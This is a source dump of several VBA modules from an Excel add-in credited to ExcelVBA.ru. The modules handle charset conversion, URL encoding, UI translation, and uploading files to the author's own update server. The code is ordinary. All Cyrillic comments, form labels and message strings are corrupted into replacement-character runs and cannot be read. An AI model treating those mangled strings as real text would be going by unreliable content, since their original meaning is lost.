'        .LabelText = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd|."
'    End With
'    With Vars.Add
'        .ControlType = "Combobox"
'        .LabelText = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
'    End With
'    With Vars.Add
'        .ControlType = "Textbox"
'        .LabelText = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
'    End With
'    With Vars.Add
'        .ControlType = "Checkbox"
'        .LabelText = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
'    End With
'
'
'    Vars.CreateControls UserForm1.Frame1
'    AppActivate Application.Name
'End Sub


Function ChangeFileCharset_UTF8noBOM(ByVal FileName$, Optional ByVal SourceCharset$) As Boolean
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| filename$ |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|,
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| TRUE, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Err.Clear
    DestCharset$ = "utf-8"
    With CreateObject("ADODB.Stream")
        .Type = 2
        If Len(SourceCharset$) Then .Charset = SourceCharset$        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        .Open
        .LoadFromFile FileName$        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
        FileContent$ = .ReadText        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| FileContent$
        .Close
        .Charset = DestCharset$        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| "utf-8"
        .Open
        .WriteText FileContent$
        
        'Write your data into the stream.
        
        Dim binaryStream As Object
        Set binaryStream = CreateObject("ADODB.Stream")
        binaryStream.Type = 1
        binaryStream.Mode = 3
        binaryStream.Open
        'Skip BOM bytes
        .Position = 3
        .CopyTo binaryStream
        .flush
        .Close
        binaryStream.SaveToFile FileName$, 2
        binaryStream.Close
    End With
    ChangeFileCharset_UTF8noBOM = Err = 0
End Function

Sub SaveToCurrentFolder()
    On Error Resume Next
    If ActiveWorkbook Is Nothing Then Exit Sub
    
    Folder$ = GetOpenedFolder
    If Folder$ = "" Then MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", vbCritical: Exit Sub
    If Not FolderExists(Folder$) Then MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", vbCritical: Exit Sub
    
    With Application.FileDialog(msoFileDialogSaveAs)
        .InitialFileName = Folder$ & ActiveWorkbook.Name
        .FilterIndex = 1
        If .Show <> -1 Then Exit Sub
        FileName$ = .SelectedItems(1)
    End With
    
    Application.DisplayAlerts = False
    ActiveWorkbook.RemovePersonalInformation = False
    ActiveWorkbook.SaveAs FileName$, FileFormatByExtension(FWF.GetFileExtension(FileName$))
    Application.DisplayAlerts = True
End Sub

Function GetOpenedFolder() As String
    On Error Resume Next
    Dim w As WebBrowser, oShellWind As New ShellWindows, Folder$
    For Each w In oShellWind
        If w.LocationURL Like "file:///[C-Z]:/*" Then
            Folder$ = Replace(Split(Replace(w.LocationURL, "%20", " "), "file:///")(1), "/", "\") & "\"
            If Folder$ Like ThisWorkbook.Path & "\*" Then Exit For
        ElseIf w.LocationURL Like "file://[A-Za-z]*/*" Then
            Folder$ = Replace(Split(Replace(w.LocationURL, "%20", " "), "file:")(1), "/", "\") & "\"
            If Folder$ Like ThisWorkbook.Path & "\*" Then Exit For
        End If
    Next
    Set oShellWind = Nothing
    GetOpenedFolder = Folder$
End Function

Function ChangeTextCharset(ByVal txt$, ByVal DestCharset$, _
        Optional ByVal SourceCharset$) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| txt$,
    ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| DestCharset$ (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Err.Clear
    With CreateObject("ADODB.Stream")
        .Type = 2: .Mode = 3
        If Len(SourceCharset$) Then .Charset = SourceCharset$        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        .Open
        .WriteText txt$
        .Position = 0
        .Charset = DestCharset$        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        ChangeTextCharset = .ReadText
        .Close
    End With
End Function

Function ParseString(ByVal txt As String) As Variant
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| N * 4 (|fffd||fffd||fffd| N - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)
    On Error Resume Next
    n = Len(txt): ReDim arr(1 To n, 1 To 4)
    For i = LBound(arr) To UBound(arr)
        arr(i, 1) = i
        l$ = Mid(txt, i, 1)
        arr(i, 2) = IIf(Asc(l$) = 7, "", l$)
        arr(i, 3) = Asc(l$)
        arr(i, 4) = AscW(l$)
    Next i
    ' arr(1, 1) = "|fffd|": arr(1, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd|": arr(1, 3) = "Asc": arr(1, 4) = "AscW"
    ParseString = arr
End Function

Sub ShowCharcodes(ByVal txt$)
    On Error Resume Next
    With New F_char
        .Show
        .DisplayText txt$
    End With
End Sub

Function SelectAction() As String
    On Error Resume Next
    SelectedActionCodename$ = ""
    FP_SelectAction.Show
    SelectAction = SelectedActionCodename$
End Function

Function URL_Encode1(ByVal txt As String) As String
    For i = 1 To Len(txt)
        l = Mid(txt, i, 1)
        Select Case AscW(l)
            Case Is > 4095: t = "%" & Hex(AscW(l) \ 64 \ 64 + 224) & "%" & Hex(AscW(l) \ 64) & "%" & Hex(8 * 16 + AscW(l) Mod 64)
            Case Is > 127: t = "%" & Hex(AscW(l) \ 64 + 192) & "%" & Hex(8 * 16 + AscW(l) Mod 64)
            Case 32: t = "%20"
            Case Else: t = l
        End Select
        URL_Encode1 = URL_Encode1 & t
    Next
End Function

Function URL_Encode2(ByVal txt As String) As String
    For i = 1 To Len(txt)
        l = Mid(txt, i, 1)
        Select Case AscW(l)
            Case Is > 4095: t = "%" & Hex(AscW(l) \ 64 \ 64 + 224) & "%" & Hex(AscW(l) \ 64) & "%" & Hex(8 * 16 + AscW(l) Mod 64)
            Case Is > 127: t = "%" & Hex(AscW(l) \ 64 + 192) & "%" & Hex(8 * 16 + AscW(l) Mod 64)
            Case 32: t = "+"
            Case 0 To 43, 47, 58 To 64, 91 To 93, Is >= 123: t = "%" & IIf(Len(Hex(Asc(l))) = 1, "0", "") & Hex(Asc(l))
            Case Else: t = l
        End Select
        URL_Encode2 = URL_Encode2 & t
    Next
End Function

Sub test_new_pi_222222()
    Dim pi As New ProgressIndicatorNew, X As Variant
    pi.Show "test indicator"
    pi.StartNewAction 5, 20, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 5-20"
    Application.Wait Now + 1 / 86400
    
    pi.StartNewAction 20, 40, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 20-40", , , 8
    For i = 1 To 4
        Application.Wait Now + 1 / 86400
        If i = 3 Then X = pi.ResetSettings: Debug.Print "reset"
        
        pi.SubAction , "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 2 - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & i & ""
    Next
    Application.Wait Now + 1 / 86400
    pi.StartNewAction 80, 90, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 80-90"
    Debug.Print "restore"
    pi.RestoreSettings X
    pi.Repaint
End Sub

Sub test_434333333333()
    Dim pi As New ProgressIndicatorNew, X As Variant, txt$, i&
    pi.TestMode = True
    pi.Show "test indicator"
    pi.StartNewAction 5, 20, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 5-20"
    ' pi.ShowMessage "message text"
    pi.ShowExtraBar "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"    ', True
    
    Dim v1&, v2&, v3&, ProgressLineText$
    v1 = 10: v2 = 23: v3 = 67
    'v1 = 0: v2 = 0: v3 = 100
    
    'ProgressLineText$ = String(v1&, ChrW(9632)) & String(v2&, ChrW(9637)) & String(v3&, ChrW(9633))
    ProgressLineText$ = String(v1&, ChrW(9646)) & String(v2&, ChrW(9705)) & String(v3&, ChrW(9647))
    pi.FP.ExtraBar = " " & ProgressLineText$
    
    With pi.FP.ExtraBar
        ' .SpecialEffect = fmSpecialEffectSunken
        .Height = 13.5
        .Font.Size = 9
    End With
End Sub


Attribute VB_Name = "mod_Translate"
'---------------------------------------------------------------------------------------
' Module        : mod_Translate                    Version: 2.3
' Author        : Igor Vakhnenko                   Date: 21.05.2018
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Private Module: Option Compare Text: Option Explicit
Public Const TRANSLATE_SHEET_FIRST_ROW& = 5, DEFAULT_LANGUAGE$ = "en"
Dim DoNotTranslate As Boolean

Function TR_DIC() As Dictionary
    Static objTRDIC As Dictionary
    If Not objTRDIC Is Nothing Then
        Set TR_DIC = objTRDIC: Exit Function
    Else
        Set objTRDIC = New Dictionary: objTRDIC.CompareMode = TextCompare
        PrepareTraslateDictionary
        Set TR_DIC = objTRDIC
    End If
End Function

Sub TranslateUserForm(ByRef UF As Object)
    If DoNotTranslate Then Exit Sub
    On Error Resume Next: Dim ctrl As MSForms.Control, fcaption$
    fcaption$ = tt(UF.Name & "_caption"): If Len(fcaption$) Then UF.Caption = fcaption$
    For Each ctrl In UF.Controls
        UpdateControl ctrl, UF.Name
    Next
End Sub

Sub UpdateControl(ByRef ctrl As Object, Optional ByVal ParentName$)
    On Error Resume Next
    Dim m_page As Object, ID$, res$
    If TypeName(ctrl) = "MultiPage" Then
        For Each m_page In ctrl.Pages
            UpdateControl m_page, ParentName$ & "\" & ctrl.Name
        Next
    Else
        ID$ = ParentName$ & IIf(ParentName$ <> "", "\", "") & ctrl.Name
        res$ = tt(ID$)
        If Len(res$) Then ctrl.Caption = res$

        If Len(ctrl.Tag) Then
            ID$ = "tag:" & ParentName$ & IIf(ParentName$ <> "", "\", "") & ctrl.Name
            res$ = tt(ID$)
            If Len(res$) Then ctrl.Tag = res$
        End If

        If Len(ctrl.ControlTipText) Then
            ID$ = "ControlTipText:" & ParentName$ & IIf(ParentName$ <> "", "\", "") & ctrl.Name
            res$ = tt(ID$)
            If Len(res$) Then ctrl.ControlTipText = res$
        End If
    End If
End Sub


' ===================== prepare translations ==========================
Private Sub loadInfo_UserForms()
    On Error Resume Next
    DoNotTranslate = True

    PrintWords F_Variables

    ' PrintWords F_FirstRun
    DoNotTranslate = False
End Sub

Private Sub PrintUserformNames()
    On Error Resume Next
    Dim VBComp As Object
    For Each VBComp In ThisWorkbook.VBProject.VBComponents
        If VBComp.Type = 3 Then Debug.Print VBComp.Name
    Next VBComp
End Sub

Sub PrintWords(ByRef UF As Object)
    On Error Resume Next
    shtr.Range("a" & shtr.Rows.Count).End(xlUp).Offset(2) = UF.Name & " controls"
    Dim ctrl As MSForms.Control
    For Each ctrl In UF.Controls
        AddControlInformation ctrl, UF.Name
    Next
End Sub

Sub AddControlInformation(ByRef ctrl As Object, Optional ByVal ParentName$)
    On Error Resume Next
    Dim cell As Range, m_page As Object, ID$
    If TypeName(ctrl) = "MultiPage" Then
        For Each m_page In ctrl.Pages
            AddControlInformation m_page, ParentName$ & "\" & ctrl.Name
        Next
    Else
        ID$ = ParentName$ & IIf(ParentName$ <> "", "\", "") & ctrl.Name
        Debug.Print ID$
        If Len(ctrl.Caption) Then
            Set cell = shtr.Range("a" & shtr.Rows.Count).End(xlUp).Offset(1)
            cell.Resize(, 2).value = Array(ID$, ctrl.Caption)
        End If

        If Len(ctrl.Tag) Then
            If ctrl.Tag <> "ScrollCombo" Then
                Set cell = shtr.Range("a" & shtr.Rows.Count).End(xlUp).Offset(1)
                ID$ = "tag:" & ParentName$ & IIf(ParentName$ <> "", "\", "") & ctrl.Name
                cell.Resize(, 2).value = Array(ID$, ctrl.Tag)
            End If
        End If

        If Len(ctrl.ControlTipText) Then
            Set cell = shtr.Range("a" & shtr.Rows.Count).End(xlUp).Offset(1)
            ID$ = "ControlTipText:" & ParentName$ & IIf(ParentName$ <> "", "\", "") & ctrl.Name
            cell.Resize(, 2).value = Array(ID$, ctrl.ControlTipText)
        End If
    End If
End Sub

Function SYSTEM_LANGUAGE() As String
    On Error Resume Next
    Select Case Application.LanguageSettings.LanguageID(msoLanguageIDUI)
        Case 1049: SYSTEM_LANGUAGE = "ru"
        Case Else: SYSTEM_LANGUAGE = DEFAULT_LANGUAGE
    End Select
End Function

Function SetLanguage(ByVal new_lang_code$) As Boolean
    ' returns TRUE if language was changed (interface needs to be translated)
    On Error Resume Next
    Dim prev_lang_code$: prev_lang_code$ = GetLanguage
    SETT.SetText "Language", new_lang_code$, "Setup"

    SetLanguage = LCase(prev_lang_code$) <> LCase(new_lang_code$)
    If SetLanguage Then PrepareTraslateDictionary        ': CreateProgramCommandBar
End Function

Function GetLanguage() As String
    GetLanguage = SETT.GetText("Setup\Language", SYSTEM_LANGUAGE)
End Function

Function RUS() As Boolean
    RUS = SETT.GetText("Setup\Language", SYSTEM_LANGUAGE) = "ru"
End Function

Function tt(ByVal ID$, ParamArray tokens()) As String
    On Error Resume Next: Dim i&, AddSpaces As Boolean
    If ID$ Like "|??*" Then ID$ = SETT.U(Mid(ID$, 2))
    If ID$ Like " ?*" Then ID$ = Mid(ID$, 2): AddSpaces = True
    tt = TR_DIC.item(ID$)
    If Not IsMissing(tokens) Then
        For i = LBound(tokens) To UBound(tokens)
            tt = Replace(tt, "!" & (i + 1), tokens(i))
        Next i
    End If
    tt = Replace(tt, "!add-in", PROJECT_NAME$)
    tt = Replace(tt, "//n", "$!n!$")
    tt = Replace(tt, "/n", vbNewLine)
    tt = Replace(tt, "$!n!$", "//n")
    If AddSpaces Then tt = " " & tt & " "
End Function

Function PrepareTraslateDictionary()
    On Error Resume Next: Err.Clear
    Dim ra As Range, KEYarr As Variant, VALarr As Variant, AvLangArr As Variant, col&, lang_code$, i&, k, v$
    Set ra = shtr.Range(shtr.Cells(TRANSLATE_SHEET_FIRST_ROW, 1), shtr.Range("A" & shtr.Rows.Count).End(xlUp))
    If ra.row < TRANSLATE_SHEET_FIRST_ROW Then
        MsgBox "Translation sheet has no data", vbCritical, "Contact the developer"
        End
    End If

    lang_code$ = GetLanguage: AvLangArr = AvailableLanguagesArray(True)
    For i = LBound(AvLangArr) To UBound(AvLangArr)
        If LCase(AvLangArr(i, 1)) = LCase(lang_code$) Then col& = i: Exit For
    Next i

    If col& = 0 Then
        lang_code$ = DEFAULT_LANGUAGE
        For i = LBound(AvLangArr) To UBound(AvLangArr)
            If LCase(AvLangArr(i, 1)) = LCase(lang_code$) Then col& = i: Exit For
        Next i
    End If

    If col& = 0 Then
        MsgBox "Translation error: unsupported language |fffd|" & GetLanguage & "|fffd|", vbCritical, "Contact the developer"
        End
    End If

    KEYarr = ra.value
    VALarr = ra.Offset(, col&).value

    With TR_DIC
        .RemoveAll
        .CompareMode = TextCompare
        For i = LBound(KEYarr) To UBound(KEYarr)
            v$ = VALarr(i, 1)
            For Each k In Split(KEYarr(i, 1), "|")
                If Len(k) Then If Not .Exists(CStr(k)) Then .item(CStr(k)) = v$
            Next k
        Next i
    End With
End Function

Function AvailableLanguagesArray(Optional FullList As Boolean = False) As Variant
    On Error Resume Next: Err.Clear
    Dim ra As Range, arr, res, i&, ii&, dic As New Dictionary, ind&, CurrLangPresentInList As Boolean, CurrLanguage$, CurrLanguageColumn&
    Set ra = shtr.Range(shtr.[b1], shtr.Range("z1").End(xlToLeft)).Resize(4)
    If Err Then
        MsgBox "Translation sheet is absent", vbCritical, "Contact the developer"
        End
    End If
    If ra.Column < 2 Then
        MsgBox "Translation sheet is blank", vbCritical, "Contact the developer"
        End
    End If

    If FullList Then
        AvailableLanguagesArray = Application.Transpose(ra.value)
        Exit Function
    End If

    arr = ra.value
    ind& = 0: dic.CompareMode = TextCompare: CurrLanguage$ = GetLanguage
    For ii = LBound(arr, 2) To UBound(arr, 2)
        If arr(1, ii) = CurrLanguage$ Then CurrLanguageColumn& = ii
        For i = LBound(arr, 2) To UBound(arr, 2)
            If Val(arr(4, i)) = ii Then
                ind& = ind& + 1: dic.item(ind&) = i
                If arr(1, i) = CurrLanguage$ Then CurrLangPresentInList = True
            End If
        Next i
    Next ii
    If Not CurrLangPresentInList Then If CurrLanguageColumn& Then dic.item(ind& + 1) = CurrLanguageColumn&

    If ind& = 0 Then
        MsgBox "Translation sheet error: can't find language indexes", vbCritical, "Contact the developer"
        End
    End If

    ReDim res(1 To dic.Count, 1 To 2)
    For i = LBound(res) To UBound(res)
        res(i, 1) = arr(1, dic.item(i))
        res(i, 2) = arr(2, dic.item(i))
    Next i

    AvailableLanguagesArray = res
    Set dic = Nothing
End Function

Sub OneMoreSettingsForm()
    SetLanguage "en"
    With New F_Settings
        .Show
    End With
End Sub

Sub TranslateWorkbook(ByRef WB As Workbook)
    On Error Resume Next:    Dim n As Name, txt$
    For Each n In WB.Names
        'Debug.Print n.Name & vbTab & n.RefersToRange.Value
        txt$ = tt(n.Name)
        If Len(txt) Then n.RefersToRange.Cells(1).value = txt
    Next
End Sub

'Function TranslateHyperlink(ByVal URL$, Optional ByVal ForTip As Boolean = False) As String
'    On Error Resume Next
'    TranslateHyperlink = URL$
'    LangCode$ = GetLanguageCode$
'    If LangCode$ = "ru" Or LangCode$ = "" Then Exit Function
'    ' If ForTip Then TranslateHyperlink = "Translation of " & URL$: Exit Function
'    If ForTip Then TranslateHyperlink = "(Russian -> " & GetLanguage$ & ") " & URL$: Exit Function
'    TranslateHyperlink = "http://translate.google.com/translate?sl=ru&tl=" & LangCode$ & "&u=" & URLEncode(URL$)
'End Function


Attribute VB_Name = "mod_Upload"
'---------------------------------------------------------------------------------------
' Module        : modUpload                    Version:
' Author        : Igor Vakhnenko                   Date: 10.11.2018
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Private Module
Option Explicit

Function MULTIPART_FORM_DATA_BOUNDARY$()
    MULTIPART_FORM_DATA_BOUNDARY$ = Chr(169) & "ExcelVBA.ru Uploader" & Chr(169)
End Function

Function GetMultipartFormData(Optional ByVal FileName$, Optional ByVal AttrName$ = "file", _
        Optional ByVal AttrContentType$ = "application/octet-stream", Optional ByVal PostData$) As String
    On Error Resume Next
    Dim FileContents$, txt$, v, ParamName$, ParamValue$, fname$
    
    For Each v In Split(PostData$, "&")
        If Len(Trim(v)) Then
            ParamName$ = "": ParamValue$ = "": ParamName$ = Split(v, "=")(0): ParamValue$ = Split(v, "=", 2)(1)
            txt$ = txt$ & "--" & MULTIPART_FORM_DATA_BOUNDARY$ & vbCrLf
            txt$ = txt$ & "Content-Disposition: form-data; name=""" & ParamName$ & """;" & vbCrLf & vbCrLf
            txt$ = txt$ & ParamValue$ & vbCrLf
        End If
    Next
    
    If Len(Trim(FileName$)) Then
        fname$ = Dir(FileName$, vbNormal)
        FileContents$ = GetFileContents(Trim(FileName$))    'Get source file As a string
        txt$ = txt$ & "--" & MULTIPART_FORM_DATA_BOUNDARY$ & vbCrLf
        txt$ = txt$ & "Content-Disposition: form-data; name=""" & AttrName$ & """;" & " filename=""" & fname$ & """" & vbCrLf
        txt$ = txt$ & "Content-Type: " & AttrContentType$ & vbCrLf & vbCrLf
        txt$ = txt$ & FileContents$ & vbCrLf
    End If
    txt$ = txt$ & "--" & MULTIPART_FORM_DATA_BOUNDARY$ & "--" & vbCrLf
    
    GetMultipartFormData = txt
End Function

Private Sub Test_Upload()
    Dim FileName$, res, PostData$
    FileName$ = "C:\Users\|fffd||fffd||fffd||fffd||fffd|\Desktop\|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - ExcelVBA.ru.xlsx"
    PostData = "pid=128&action=upload"
    res = UploadFile("https://ExcelVBA.ru/updates/upload.php", FileName$, SETT.PostData & "&" & PostData)
    Debug.Print res
End Sub

Private Sub Test_UpdateInfo()
    Dim res, PostData$
    PostData = "pid=128&action=update&fid=10&update_field=filetype&update_value=123"
    res = UploadFile("https://ExcelVBA.ru/updates/upload.php", , SETT.PostData & "&" & PostData)
    Debug.Print res
End Sub

Private Sub Test_DeleteInfo()
    Dim res, PostData$
    PostData = "pid=128&action=delete&fid=2"
    res = UploadFile("https://ExcelVBA.ru/updates/upload.php", , SETT.PostData & "&" & PostData)
    Debug.Print res
End Sub

Function UploadFile(ByVal PostURL$, Optional ByVal FileName$, Optional ByVal PostData$) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:
    ' PostURL$ - URL |fffd||fffd||fffd| POST |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' FileName$ - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    ' PostData$ - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| a=1&b=2
    
    On Error Resume Next
    Dim sFormData As String, b() As Byte
    sFormData = GetMultipartFormData(FileName$, , , PostData$)
    b = StrConv(sFormData, vbFromUnicode)
    'ShowText sFormData
    
    Dim objH As New WinHttpRequest, answ$
    objH.Open "POST", PostURL$, True
    objH.SetRequestHeader "Content-Type", "multipart/form-data; Charset=UTF-8; boundary=" & MULTIPART_FORM_DATA_BOUNDARY$
    
    objH.Send (b): DoEvents
    If objH.WaitForResponse(4) Then UploadFile = objH.Status & ";" & objH.ResponseText
    Set objH = Nothing
End Function

Function GetFileContents(ByVal FileName$) As String    'read binary file As a string value
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd| FileName |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Dim FileContents() As Byte, FileNumber As Integer
    ReDim FileContents(FileLen(FileName) - 1)
    FileNumber = FreeFile
    Open FileName For Binary As FileNumber
    Get FileNumber, , FileContents
    Close FileNumber
    GetFileContents = StrConv(FileContents, vbUnicode)
End Function

Attribute VB_Name = "mod_Variables"
'---------------------------------------------------------------------------------------
' Module        : mod_Variables                    Version:
' Author        : Igor Vakhnenko                   Date: 27.10.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Compare Text: Option Private Module

Public VariablesToShow As Variables, VariablesDialogResult As Boolean, STick&, CTick&
Public Const ALL_ITEMS_OPTION$ = "<|fffd||fffd||fffd|>"

Function ShowVariablesDialog(Optional ByVal VariableNameList$) As Boolean
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
